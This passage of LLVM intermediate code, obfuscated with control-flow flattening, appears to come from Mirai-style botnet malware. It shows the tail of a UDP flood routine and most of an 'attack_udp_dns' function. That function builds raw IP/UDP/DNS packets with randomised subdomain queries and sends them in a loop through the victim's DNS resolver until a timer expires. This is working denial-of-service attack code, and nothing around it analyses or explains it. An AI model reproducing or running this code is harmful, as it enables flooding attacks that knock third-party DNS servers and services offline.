  %240 = call i32 @rand_next()
  %241 = trunc i32 %240 to i16
  %242 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 0
  store i16 %241, i16* %243, align 2
  store i32 -1013761162, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i16, i16* %19, align 2
  %246 = zext i16 %245 to i32
  %247 = icmp eq i32 %246, 65535
  %248 = select i1 %247, i32 93440364, i32 -1402740216
  store i32 %248, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = call i32 @rand_next()
  %251 = trunc i32 %250 to i16
  %252 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %253 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %252, i32 0, i32 1
  store i16 %251, i16* %253, align 2
  store i32 -1402740216, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 7
  store i16 0, i16* %256, align 2
  %257 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %258 = bitcast %struct.iphdr* %257 to i16*
  %259 = call zeroext i16 @checksum_generic(i16* %258, i32 20)
  %260 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 7
  store i16 %259, i16* %261, align 2
  %262 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %263 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %262, i32 0, i32 3
  store i16 0, i16* %263, align 2
  %264 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %265 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %266 = bitcast %struct.udphdr* %265 to i8*
  %267 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %268 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %267, i32 0, i32 2
  %269 = load i16, i16* %268, align 2
  %270 = load i32, i32* %21, align 4
  %271 = sext i32 %270 to i64
  %272 = add i64 12, %271
  %273 = trunc i64 %272 to i32
  %274 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %264, i8* %266, i16 zeroext %269, i32 %273)
  %275 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %276 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %275, i32 0, i32 3
  store i16 %274, i16* %276, align 2
  %277 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %278 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %277, i32 0, i32 1
  %279 = load i16, i16* %278, align 2
  %280 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %281 = load i32, i32* %11, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %280, i64 %282
  %284 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %283, i32 0, i32 0
  %285 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %284, i32 0, i32 1
  store i16 %279, i16* %285, align 2
  %286 = load i32, i32* %12, align 4
  %287 = load i8*, i8** %26, align 8
  %288 = load i32, i32* %21, align 4
  %289 = sext i32 %288 to i64
  %290 = add i64 32, %289
  %291 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %292 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %293 = load i32, i32* %11, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %295, i32 0, i32 0
  %297 = bitcast %struct.sockaddr_in* %296 to %struct.sockaddr*
  store %struct.sockaddr* %297, %struct.sockaddr** %291, align 8
  %298 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %299 = load %struct.sockaddr*, %struct.sockaddr** %298, align 8
  %300 = call i64 @sendto(i32 %286, i8* %287, i64 %290, i32 16384, %struct.sockaddr* %299, i32 16)
  store i32 1014390205, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = load i32, i32* %11, align 4
  %303 = add nsw i32 %302, 1
  store i32 %303, i32* %11, align 4
  store i32 -248379574, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  %305 = call i64 @time(i64* null) #6
  %306 = load i32, i32* %22, align 4
  %307 = sext i32 %306 to i64
  %308 = icmp sgt i64 %305, %307
  %309 = select i1 %308, i32 754638184, i32 -185928306
  store i32 %309, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  store i32 1030077141, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  store i32 1109990166, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %311, %310, %304, %301, %254, %249, %244, %239, %234, %229, %224, %203, %183, %177, %176, %175, %172, %136, %132, %84, %78, %77, %74, %68, %67, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i8*
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca %struct.dnshdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.grehdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.udphdr*, align 8
  %38 = alloca %struct.dnshdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %41 = load i8, i8* %7, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %13, align 8
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %15, align 2
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %16, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 0)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %17, align 1
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %18, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 53)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %19, align 2
  %69 = load i8, i8* %9, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 9, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %20, align 2
  %73 = load i8, i8* %9, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 0, i32 12)
  %76 = trunc i32 %75 to i8
  store i8 %76, i8* %21, align 1
  %77 = load i8, i8* %9, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %79 = call i8* @attack_get_opt_str(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 8, i8* null)
  store i8* %79, i8** %22, align 8
  store i32 0, i32* %23, align 4
  %80 = call i32 @get_dns_resolver()
  store i32 %80, i32* %24, align 4
  %81 = call i64 @time(i64* null) #6
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = add nsw i64 %81, %83
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %25, align 4
  %86 = load i8*, i8** %22, align 8
  store i8* %86, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 -351550865, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -351550865, label %first
    i32 -769155871, label %89
    i32 -214166418, label %90
    i32 1863468106, label %96
    i32 638409433, label %97
    i32 2024259426, label %103
    i32 2077518361, label %106
    i32 1212165333, label %107
    i32 -283954381, label %113
    i32 -1336158398, label %169
    i32 1976704696, label %173
    i32 -75321964, label %226
    i32 -2015570495, label %231
    i32 483885545, label %240
    i32 72130886, label %250
    i32 -1792100445, label %253
    i32 -18302467, label %254
    i32 1748771401, label %257
    i32 -1101330155, label %272
    i32 -1220668593, label %275
    i32 1517648313, label %276
    i32 -934097023, label %277
    i32 66245114, label %283
    i32 -1695882007, label %305
    i32 -1697567738, label %311
    i32 1582813073, label %316
    i32 -1880899772, label %322
    i32 12094529, label %327
    i32 965615654, label %333
    i32 -1530062833, label %338
    i32 1818588633, label %344
    i32 1133425748, label %416
    i32 1535651462, label %419
    i32 1849957562, label %425
    i32 1896812765, label %426
    i32 1620967329, label %427
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %87 = icmp eq i8* %.reload, null
  %88 = select i1 %87, i32 -769155871, i32 -214166418
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 1620967329, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i8*, i8** %22, align 8
  %92 = call i32 @util_strlen(i8* %91)
  store i32 %92, i32* %23, align 4
  %93 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %93, i32* %12, align 4
  %94 = icmp eq i32 %93, -1
  %95 = select i1 %94, i32 1863468106, i32 638409433
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  store i32 1620967329, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %98 = load i32, i32* %12, align 4
  %99 = bitcast i32* %11 to i8*
  %100 = call i32 @setsockopt(i32 %98, i32 0, i32 3, i8* %99, i32 4) #6
  %101 = icmp eq i32 %100, -1
  %102 = select i1 %101, i32 2024259426, i32 2077518361
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %12, align 4
  %105 = call i32 @close(i32 %104)
  store i32 1620967329, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 1212165333, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = load i32, i32* %11, align 4
  %109 = load i8, i8* %7, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp slt i32 %108, %110
  %112 = select i1 %111, i32 -283954381, i32 -1220668593
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 0, i32* %26, align 4
  store i8 0, i8* %27, align 1
  store i8 0, i8* %28, align 1
  %114 = call noalias i8* @calloc(i64 600, i64 1) #6
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %13, align 8
  %120 = load i32, i32* %11, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %29, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.udphdr*
  store %struct.udphdr* %127, %struct.udphdr** %30, align 8
  %128 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %129 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %128, i64 1
  %130 = bitcast %struct.udphdr* %129 to %struct.dnshdr*
  store %struct.dnshdr* %130, %struct.dnshdr** %31, align 8
  %131 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %132 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %131, i64 1
  %133 = bitcast %struct.dnshdr* %132 to i8*
  store i8* %133, i8** %32, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, 15
  %138 = or i8 %137, 64
  store i8 %138, i8* %135, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, -16
  %143 = or i8 %142, 5
  store i8 %143, i8* %140, align 4
  %144 = load i8, i8* %14, align 1
  %145 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 1
  store i8 %144, i8* %146, align 1
  %147 = load i8, i8* %21, align 1
  %148 = zext i8 %147 to i64
  %149 = add i64 41, %148
  %150 = add i64 %149, 2
  %151 = load i32, i32* %23, align 4
  %152 = sext i32 %151 to i64
  %153 = add i64 %150, %152
  %154 = add i64 %153, 4
  %155 = trunc i64 %154 to i16
  %156 = call zeroext i16 @htons(i16 zeroext %155) #7
  %157 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 2
  store i16 %156, i16* %158, align 2
  %159 = load i16, i16* %15, align 2
  %160 = call zeroext i16 @htons(i16 zeroext %159) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 3
  store i16 %160, i16* %162, align 4
  %163 = load i8, i8* %16, align 1
  %164 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 5
  store i8 %163, i8* %165, align 4
  %166 = load i8, i8* %17, align 1
  %167 = icmp ne i8 %166, 0
  %168 = select i1 %167, i32 -1336158398, i32 1976704696
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %171 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 4
  store i16 %170, i16* %172, align 2
  store i32 1976704696, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 6
  store i8 17, i8* %175, align 1
  %176 = load i32, i32* @LOCAL_ADDR, align 4
  %177 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 8
  store i32 %176, i32* %178, align 4
  %179 = load i32, i32* %24, align 4
  %180 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 9
  store i32 %179, i32* %181, align 4
  %182 = load i16, i16* %18, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %185 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %184, i32 0, i32 0
  store i16 %183, i16* %185, align 2
  %186 = load i16, i16* %19, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i32 0, i32 1
  store i16 %187, i16* %189, align 2
  %190 = load i8, i8* %21, align 1
  %191 = zext i8 %190 to i64
  %192 = add i64 21, %191
  %193 = add i64 %192, 2
  %194 = load i32, i32* %23, align 4
  %195 = sext i32 %194 to i64
  %196 = add i64 %193, %195
  %197 = add i64 %196, 4
  %198 = trunc i64 %197 to i16
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 2
  store i16 %199, i16* %201, align 2
  %202 = load i16, i16* %20, align 2
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %205 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %204, i32 0, i32 0
  store i16 %203, i16* %205, align 2
  %206 = call zeroext i16 @htons(i16 zeroext 256) #7
  %207 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %208 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %207, i32 0, i32 1
  store i16 %206, i16* %208, align 2
  %209 = call zeroext i16 @htons(i16 zeroext 1) #7
  %210 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %211 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %210, i32 0, i32 2
  store i16 %209, i16* %211, align 2
  %212 = load i8, i8* %21, align 1
  %213 = load i8*, i8** %32, align 8
  %214 = getelementptr inbounds i8, i8* %213, i32 1
  store i8* %214, i8** %32, align 8
  store i8 %212, i8* %213, align 1
  %215 = load i8, i8* %21, align 1
  %216 = zext i8 %215 to i32
  %217 = load i8*, i8** %32, align 8
  %218 = sext i32 %216 to i64
  %219 = getelementptr inbounds i8, i8* %217, i64 %218
  store i8* %219, i8** %32, align 8
  %220 = load i8*, i8** %32, align 8
  store i8* %220, i8** %33, align 8
  %221 = load i8*, i8** %32, align 8
  %222 = getelementptr inbounds i8, i8* %221, i64 1
  %223 = load i8*, i8** %22, align 8
  %224 = load i32, i32* %23, align 4
  %225 = add nsw i32 %224, 1
  call void @util_memcpy(i8* %222, i8* %223, i32 %225)
  store i32 0, i32* %26, align 4
  store i32 -75321964, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i32, i32* %26, align 4
  %228 = load i32, i32* %23, align 4
  %229 = icmp slt i32 %227, %228
  %230 = select i1 %229, i32 -2015570495, i32 1748771401
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load i8*, i8** %22, align 8
  %233 = load i32, i32* %26, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i8, i8* %232, i64 %234
  %236 = load i8, i8* %235, align 1
  %237 = sext i8 %236 to i32
  %238 = icmp eq i32 %237, 46
  %239 = select i1 %238, i32 483885545, i32 72130886
  store i32 %239, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = load i8, i8* %27, align 1
  %242 = load i8*, i8** %33, align 8
  store i8 %241, i8* %242, align 1
  store i8 0, i8* %27, align 1
  %243 = load i8, i8* %28, align 1
  %244 = add i8 %243, 1
  store i8 %244, i8* %28, align 1
  %245 = load i8*, i8** %32, align 8
  %246 = load i32, i32* %26, align 4
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds i8, i8* %245, i64 %247
  %249 = getelementptr inbounds i8, i8* %248, i64 1
  store i8* %249, i8** %33, align 8
  store i32 -1792100445, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i8, i8* %27, align 1
  %252 = add i8 %251, 1
  store i8 %252, i8* %27, align 1
  store i32 -1792100445, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  store i32 -18302467, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i32, i32* %26, align 4
  %256 = add nsw i32 %255, 1
  store i32 %256, i32* %26, align 4
  store i32 -75321964, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i8, i8* %27, align 1
  %259 = load i8*, i8** %33, align 8
  store i8 %258, i8* %259, align 1
  %260 = load i8*, i8** %32, align 8
  %261 = load i32, i32* %23, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds i8, i8* %260, i64 %262
  %264 = getelementptr inbounds i8, i8* %263, i64 2
  %265 = bitcast i8* %264 to %struct.grehdr*
  store %struct.grehdr* %265, %struct.grehdr** %34, align 8
  %266 = call zeroext i16 @htons(i16 zeroext 1) #7
  %267 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %268 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %267, i32 0, i32 0
  store i16 %266, i16* %268, align 2
  %269 = call zeroext i16 @htons(i16 zeroext 1) #7
  %270 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %271 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %270, i32 0, i32 1
  store i16 %269, i16* %271, align 2
  store i32 -1101330155, i32* %switchVar
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %273 = load i32, i32* %11, align 4
  %274 = add nsw i32 %273, 1
  store i32 %274, i32* %11, align 4
  store i32 1212165333, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  store i32 1517648313, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -934097023, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i32, i32* %11, align 4
  %279 = load i8, i8* %7, align 1
  %280 = zext i8 %279 to i32
  %281 = icmp slt i32 %278, %280
  %282 = select i1 %281, i32 66245114, i32 1535651462
  store i32 %282, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  %284 = load i8**, i8*** %13, align 8
  %285 = load i32, i32* %11, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds i8*, i8** %284, i64 %286
  %288 = load i8*, i8** %287, align 8
  store i8* %288, i8** %35, align 8
  %289 = load i8*, i8** %35, align 8
  %290 = bitcast i8* %289 to %struct.iphdr*
  store %struct.iphdr* %290, %struct.iphdr** %36, align 8
  %291 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i64 1
  %293 = bitcast %struct.iphdr* %292 to %struct.udphdr*
  store %struct.udphdr* %293, %struct.udphdr** %37, align 8
  %294 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %295 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %294, i64 1
  %296 = bitcast %struct.udphdr* %295 to %struct.dnshdr*
  store %struct.dnshdr* %296, %struct.dnshdr** %38, align 8
  %297 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %298 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %297, i64 1
  %299 = bitcast %struct.dnshdr* %298 to i8*
  %300 = getelementptr inbounds i8, i8* %299, i64 1
  store i8* %300, i8** %39, align 8
  %301 = load i16, i16* %15, align 2
  %302 = zext i16 %301 to i32
  %303 = icmp eq i32 %302, 65535
  %304 = select i1 %303, i32 -1695882007, i32 -1697567738
  store i32 %304, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = call i32 @rand_next()
  %307 = and i32 %306, 65535
  %308 = trunc i32 %307 to i16
  %309 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 3
  store i16 %308, i16* %310, align 4
  store i32 -1697567738, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load i16, i16* %18, align 2
  %313 = zext i16 %312 to i32
  %314 = icmp eq i32 %313, 65535
  %315 = select i1 %314, i32 1582813073, i32 -1880899772
  store i32 %315, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = call i32 @rand_next()
  %318 = and i32 %317, 65535
  %319 = trunc i32 %318 to i16
  %320 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %321 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %320, i32 0, i32 0
  store i16 %319, i16* %321, align 2
  store i32 -1880899772, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  %323 = load i16, i16* %19, align 2
  %324 = zext i16 %323 to i32
  %325 = icmp eq i32 %324, 65535
  %326 = select i1 %325, i32 12094529, i32 965615654
  store i32 %326, i32* %switchVar
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  %328 = call i32 @rand_next()
  %329 = and i32 %328, 65535
  %330 = trunc i32 %329 to i16
  %331 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %332 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %331, i32 0, i32 1
  store i16 %330, i16* %332, align 2
  store i32 965615654, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i16, i16* %20, align 2
  %335 = zext i16 %334 to i32
  %336 = icmp eq i32 %335, 65535
  %337 = select i1 %336, i32 -1530062833, i32 1818588633
  store i32 %337, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = call i32 @rand_next()
  %340 = and i32 %339, 65535
  %341 = trunc i32 %340 to i16
  %342 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %343 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %342, i32 0, i32 0
  store i16 %341, i16* %343, align 2
  store i32 1818588633, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i8*, i8** %39, align 8
  %346 = load i8, i8* %21, align 1
  %347 = zext i8 %346 to i32
  call void @rand_alphastr(i8* %345, i32 %347)
  %348 = load i8*, i8** %39, align 8
  %349 = load i8, i8* %21, align 1
  %350 = zext i8 %349 to i64
  %351 = getelementptr inbounds i8, i8* %348, i64 %350
  store i8 0, i8* %351, align 1
  %352 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i32 0, i32 7
  store i16 0, i16* %353, align 2
  %354 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %355 = bitcast %struct.iphdr* %354 to i16*
  %356 = call zeroext i16 @checksum_generic(i16* %355, i32 20)
  %357 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %358 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %357, i32 0, i32 7
  store i16 %356, i16* %358, align 2
  %359 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %360 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %359, i32 0, i32 3
  store i16 0, i16* %360, align 2
  %361 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %362 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %363 = bitcast %struct.udphdr* %362 to i8*
  %364 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %365 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %364, i32 0, i32 2
  %366 = load i16, i16* %365, align 2
  %367 = load i8, i8* %21, align 1
  %368 = zext i8 %367 to i64
  %369 = add i64 21, %368
  %370 = add i64 %369, 2
  %371 = load i32, i32* %23, align 4
  %372 = sext i32 %371 to i64
  %373 = add i64 %370, %372
  %374 = add i64 %373, 4
